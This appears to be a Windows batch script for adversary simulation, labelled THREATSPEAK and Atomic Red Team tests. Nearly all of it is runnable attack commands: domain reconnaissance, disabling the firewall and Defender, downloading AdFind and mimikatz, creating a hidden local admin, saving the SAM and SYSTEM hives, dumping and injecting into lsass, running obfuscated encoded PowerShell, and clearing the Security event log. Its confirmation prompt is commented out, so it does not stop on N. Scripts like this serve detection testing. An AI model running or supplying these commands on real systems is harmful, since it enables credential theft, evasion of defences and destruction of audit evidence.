@echo on

cd %appdata%

echo About to perform a series of attack techniques by THREATSPEAK. Press Y to Continue, N to Exit.
choice /c YN
rem if %errorlevel%==2 goto no

rem **Recon
net user /domain >>%appdata%\hostinfo.txt
net group /domain >>%appdata%\hostinfo.txt
net group "Domain Admins" /domain >>%appdata%\hostinfo.txt
net group "Enterprise Admins" /domain >>%appdata%\hostinfo.txt
WMIC /OUTPUT:"%appdata%\hostinfoAV.txt" /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName 

netsh advfirewall set allprofiles state off
powershell.exe Add-MpPreference -ExclusionPath “%appdata%”
powershell.exe Set-ExecutionPolicy unrestricted
powershell.exe Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -SubmitSamplesConsent NeverSend
powershell.exe -Command "(New-Object Net.WebClient).DownloadString('https://github.com/threatspeak/lab/blob/1116b35b979fe61ce31f5b51cf0f58216687203b/AdFind.exe') | Out-File AdFind.exe" 
TIMEOUT /T 3
powershell.exe -Command "(New-Object Net.WebClient).DownloadString('https://github.com/threatspeak/lab/blob/dd5d3d1e33f06925b253a7f49aca52f614d4c205/mimikatz.b64') | Out-File mimikatz.txt"
TIMEOUT /T 3

echo User Account Creation
net user admin1 123ABC456xyz /ADD
wmic useraccount where name='admin1' set passwordexpires=false
net localgroup administrators admin1 /add

echo Dump HIV System and 
reg save HKLM\SAM SamBkup.hiv
reg save HKLM\SYSTEM SystemBkup.hiv 

TIMEOUT /T 3

echo About to perform a series of Atomic Red Team tests. Press Y to Continue, N to Exit.
choice /c YN
rem if %errorlevel%==2 goto no

copy %windir%\System32\WindowsPowerShell\v1.0\powershell.exe %windir%\Temp\notepad.exe
%windir%\Temp\notepad.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
TIMEOUT /T 3
del %windir%\Temp\notepad.exe

schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR "cmd /c date /T > %windir%\Temp\current_date.txt"
TIMEOUT /T 3
schtasks /Query /TN CMDTestTask
schtasks /Delete /TN CMDTestTask /F

powershell.exe -NoProfile -Command "mavinject.exe ((Get-Process lsass).Id) /INJECTRUNNING %windir%\System32\vbscript.dll"
TIMEOUT /T 3
powershell.exe -NoProfile -Command "(ps lsass).Modules | Where-Object { $_.ModuleName -eq 'vbscript.dll' }"

powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
TIMEOUT /T 3

%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt
TIMEOUT /T 3
dir hello.txt
del hello.txt

powershell -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt"
TIMEOUT /T 3
dir LICENSE.txt
del LICENSE.txt

rundll32.exe pcwutl.dll,LaunchApplication %windir%\System32\notepad.exe
TIMEOUT /T 3

sc create CMDTestService type=own binPath="cmd /c date /T > %windir%\Temp\current_date.txt"
TIMEOUT /T 3
sc query CMDTestService
sc delete CMDTestService

powershell.exe -NoProfile -Command "rundll32.exe %windir%\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) %windir%\Temp\lsass.dmp full"
TIMEOUT /T 3
dir %windir%\Temp\lsass.dmp
del %windir%\Temp\lsass.dmp

TIMEOUT /T 10

rem **CLEAN UP
net user admin1 /delete
cd %appdata%
del *.zip
del *.hiv
powershell.exe Clear-EventLog -LogName Security
powershell.exe Set-MpPreference -DisableIntrusionPreventionSystem $false -DisableRealtimeMonitoring $false -DisableScriptScanning $false -EnableControlledFolderAccess Enabled -EnableNetworkProtection AuditMode -Force
powershell.exe Remove-MpPreference -ExclusionPath “%appdata%”
netsh advfirewall set allprofiles state on
del *.bat
del *.exe

TIMEOUT /T 10

powershell.exe Connect-WSMan -Computer "AZ-DC01a"
certutil.exe -decode mimikatz.txt mimikatz.exe
del *.txt

:no
echo Exiting

